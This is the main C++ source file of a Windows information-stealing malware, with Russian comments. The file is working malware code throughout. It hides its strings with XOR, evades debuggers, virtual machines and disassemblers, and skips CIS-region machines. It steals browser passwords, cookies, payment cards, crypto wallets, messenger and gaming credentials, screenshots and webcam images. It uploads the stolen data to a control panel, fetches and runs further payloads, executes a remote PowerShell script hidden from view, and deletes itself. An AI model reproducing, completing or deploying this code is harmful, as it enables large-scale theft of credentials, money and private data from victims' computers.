#include "../Shared.h" // домен и порт
#include "file.h" // управление файловой системой
#include "Stealing.h" // основые методы
#include "DynImport.h" // динамический импорт винапи
#include "xor.h" // шифрование строк
#include "Hash.h" // хеш функции и подобное
#include "AntiDebug.h" // анти дебаг проверки

#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/MERGE:.text=code")
#pragma comment(linker, "/MERGE:.data=data")

using std::string;

file File;
BOOL* codeInt = nullptr, *wasCalled = nullptr, isEmulated = FALSE;

#define MERGE(x,y) x##y
#define ANTIDISASM(func_name, y) __asm xor eax, eax __asm jz MERGE(label, y) \
								__asm __emit(0xB8) __asm MERGE(label, y): __asm call func_name
#ifdef RELEASE_BUILD
#define ANTIDASM(call_name) ANTIDISASM(call_name, __COUNTER__)
#else
#define ANTIDASM(call_name) call_name()
#endif

namespace Stealer
{
	string hwid;
	// HWID - уникальный номер машины
	void GetHwid()
	{
		try
		{
			char* kernel32 = XOR("Kernel32.dll");
			string output = string();

			DWORD dwVolume = 0, dwSum = 0, dwLogical = FNC(GetLogicalDrives, kernel32)();
			string query = XOR("A://");

			while (dwLogical != XorInt(0))
			{
				if (dwLogical & XorInt(1))
				{
					if (FNC(GetVolumeInformationA, kernel32)(query.c_str(), 0, 0, (DWORD*)&dwVolume, 0, 0, 0, 0))
						dwSum += dwVolume;
					dwVolume = XorInt(0);
				}

				++query[0];
				dwLogical >>= XorInt(1);
			}

			dwSum += dwSum >> XorInt(3);

			output = std::to_string(dwSum);
			output += output.substr(XorInt(2));

			string res = string();

			for (size_t i = 0; i < output.size(); ++i)
			{
				if ((i + 1) & XorInt(0x01))
					res += (char)('A' - 1 + (int)output[i]);
				else
					res += output[i];
			}

			Stealer::hwid = res;
		}
		catch (...) { Stealer::hwid = XOR("unk");  return; }
	}

	//URLS:
	const string UpLoadLink = XOR(PANEL);

	// NUMERIC DATA:
	constexpr unsigned int advance_hash = simpleHash((const char*)PANEL);
	constexpr unsigned int panel_hash = crc32((const char*)PANEL);
}

void MainThread()
{
	try
	{
#ifdef RELEASE_BUILD
		if (File.antiVmInstance()->isCis())
			return;
#endif

		char* krnl = XOR("Kernel32.dll");

		if (isEmulated)
		{
			DWORD dwNum = 0xBADA55, dwMagic = 0xDEADBEEF;
			DWORD res = dwNum ^ dwMagic;

			if (res != dwNum)
				res = dwNum ^ dwNum;

			for (int i = 0; i < res; ++i)
			{
				res -= 2;
				res %= (1 << 10);
			}

			DWORD dwStart = 0, dwEnd = 0, dwDiff = 0;
			DWORD dwMillisecondsToSleep = XorInt(600);

			dwStart = FNC(GetTickCount, krnl)();
			FNC(Sleep, krnl)(dwMillisecondsToSleep);
			dwEnd = FNC(GetTickCount, krnl)();

			dwDiff = dwEnd - dwStart;
			if (dwDiff <= dwMillisecondsToSleep - XorInt(1000))
			{
				char* pEaster = XOR("BTW i use ARCH. A - Jeffrey Epstein. R - didnt. C - kill. H - himself");
				pEaster = XOR("ok curdish");
			}
		}

		if (wasCalled != nullptr && !(*wasCalled))
			return;
		if (Stealer::UpLoadLink.size() + XorInt(1) != XorInt(sizeof(PANEL))) // проверка размера домена сейчас и домена при компиле
			return;
		if (crc32_hash(Stealer::UpLoadLink) != Stealer::panel_hash) // проверка хеша домена сейчас и при компиле
			return;
		
		// srand(FNC(GetTickCount, krnl)());
		ANTIDASM(Stealer::GetHwid);

		HANDLE mutex = FNC(CreateMutexA, krnl)(NULL, FALSE, base64_encode(Stealer::hwid).substr(0, 8).c_str()); // Проверка на открытый файл
		DWORD result = FNC(WaitForSingleObject, krnl)(mutex, 0);
		if (result != WAIT_OBJECT_0)
			return;
		Stealing sender = Stealing
		(
			XOR("General\\passwords.txt"),
			XOR("Cookies"),
			XOR("General\\forms.txt"),
			XOR("General\\cards.txt"),
			XOR("Other\\Actions.txt"),
			XOR("History"),
			XOR("Skype"),
			XOR("Wallets"),
			XOR("Software.txt"),
			XOR("Other\\Projects.txt"),
			XOR("Wallets\\Wallets.txt"),
			XorInt(PORT)
		);
		sender.InitApi();

		Grabber grabber = sender.GetSettings(Stealer::UpLoadLink, XOR("api/check.get"));
		if (grabber.bAntiVm && File.antiVmInstance()->IsVM())
			return;

		sender.GetNordVpn(XOR("NordVPN"));
		sender.GetJabber(XOR("Jabber"));
		
		if (grabber.bSteam)
			sender.GetSteam(XOR("Steam"));

		sender.GetWinScp(XOR("WinSCP"));
		sender.GetFoxmail(XOR("Foxmail"));
		sender.GetOutlook(XOR("Outlook"));

		if (grabber.bTelegram)
			sender.GetTelegram(XOR("Telegram"));
#ifdef RELEASE_BUILD
		sender.GetFiles(XOR("Files"));
#endif
		sender.GetFtpClient(XOR("WinFTP"));
		
		sender.zip.addFolder(XOR("General"));
		sender.zip.addFolder(XOR("Cookies"));
		if (grabber.bHistory)
			sender.zip.addFolder(XOR("History"));
		sender.zip.addFolder(XOR("Other"));

		string grab_path = XOR("C:");
		if (getenv(XOR("SystemDrive")) != nullptr)
			grab_path = (string)getenv(XOR("SystemDrive"));
		grab_path += XOR("\\Users");
	
#ifdef RELEASE_BUILD
		sender.GetBrowsers(grab_path);
#endif
		sender.GetEdgePasswords();
		
		sender.GetEdgeCookies();
		if (grabber.bWindowsCookie)
			sender.GetWindowsCookies();
		
		sender.GetCookieList(XOR("Other\\CookieList.txt"));
		sender.GetWallets(XOR("Wallets"));
		sender.GetDiscord(XOR("Discord"));
		sender.GetAuthy(XOR("Authy"));

		if (grabber.bScreenshot)
			sender.GetScreenShot();
		if (grabber.bWebCam)
			sender.GetWebcamScreen(XOR("Webcam.bmp"));

		sender.GetBattleNetInformation(XOR("BattleNet"));
		sender.GetOsu(XOR("Osu"));

		sender.GetInformation(XOR("Information.txt"), Stealer::hwid, Stealer::advance_hash);

		char* query = XOR("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
		sender.GetInstalledSoftware(XOR("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"));
		sender.GetInstalledSoftware(query);
		sender.GetInstalledSoftware(query, HKEY_CURRENT_USER);

		sender.Complete();

		const string upload_link = XOR("api/gate.get?p1=") + std::to_string(sender.passwords)
			+ XOR("&p2=") + std::to_string(sender.cookies)
			+ XOR("&p3=") + std::to_string(sender.cards)
			+ XOR("&p4=") + std::to_string(sender.forms)
			+ XOR("&p5=") + (sender.bSteam ? '1' : '0')
			+ XOR("&p6=") + (sender.bWallets ? '1' : '0')
			+ XOR("&p7=") + (sender.bTeleg ? '1' : '0')
			+ XOR("&p8=") + ((codeInt == nullptr ? false : *codeInt) ? '1' : '0') // Code integrity статус
			+ XOR("&p9=") + std::to_string(grabber.iStatus)
			+ XOR("&p10=") + sender.GetQuery(Stealer::UpLoadLink);
#ifdef RELEASE_BUILD
#ifdef RESERVE
		if (!sender.Release(Stealer::UpLoadLink, upload_link, Stealer::hwid + XOR(".zip")))
			sender.Release(XOR(RESERVE_DOMAIN), upload_link, Stealer::hwid + XOR(".zip"));
#else
		sender.Release(Stealer::UpLoadLink, upload_link, Stealer::hwid + XOR(".zip"));
#endif // RESERVE
#endif // RELEASE_BUILD

#ifdef RELEASE_BUILD
		if (!sender.hashes.empty())
			sender.GetLoaderInstance()->processDomains(sender.rules, sender.hashes);
		vector<LoadedFileState> loadedFiles;
		sender.GetLoaderInstance()->execute(sender.rules, sender.bWallets, loadedFiles);
		sender.CleanUp(Stealer::UpLoadLink);
		
		auto waitForSingleObject = FNC(WaitForSingleObject, krnl);

		if (!loadedFiles.empty())
		{
			bool again = true;
			while (again)
			{
				again = false;
				for (size_t i = 0; i < loadedFiles.size(); ++i)
				{
					if (!loadedFiles[i].active)
					{
						if (waitForSingleObject(loadedFiles[i].thread, 0) == WAIT_OBJECT_0)
							loadedFiles[i].active = true;
						else
							again = true;
					}
				}

				FNC(Sleep, krnl)(1000);
			}
		}
#endif
		sender.ProcessModules(Stealer::UpLoadLink);

		char* shell32 = XOR("Shell32.dll");
		char* cmd = getenv(XOR("ComSpec"));

		if (!grabber.powershellScript.empty())		
			FNC(ShellExecuteA, shell32)(0, 0, cmd, (XOR("/c powershell /c \"") + grabber.powershellScript + '\"').c_str(), 0, SW_HIDE);

		FNC(ReleaseMutex, krnl)(mutex);
		FNC(CloseHandle, krnl)(mutex);
		
		if (grabber.bSelfDelete)
			FNC(ShellExecuteA, shell32)(0, 0, cmd, (XOR("/c ping 127.0.0.1 && del \"") + File.ExePath() + '\"').c_str(), 0, SW_HIDE);
	}
	catch (...) { return; }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	try
	{
#ifdef RELEASE_BUILD
		HMODULE hExeModule = get_module_handle(0);
		AntiDebug antiDbg(hExeModule, &codeInt, &wasCalled);
		AD_STATUS status = antiDbg.Initialize();
		if (status == (AD_STATUS)XorInt((int)AD_OK))
		{
			if (antiDbg.Detect())
				return 0;
			antiDbg.StartThread();
		}
		else
			isEmulated = TRUE;
		ANTIDASM(MainThread);
#else
		MainThread();
#endif
		return 0;
	}
	catch (...) { return 0; }
}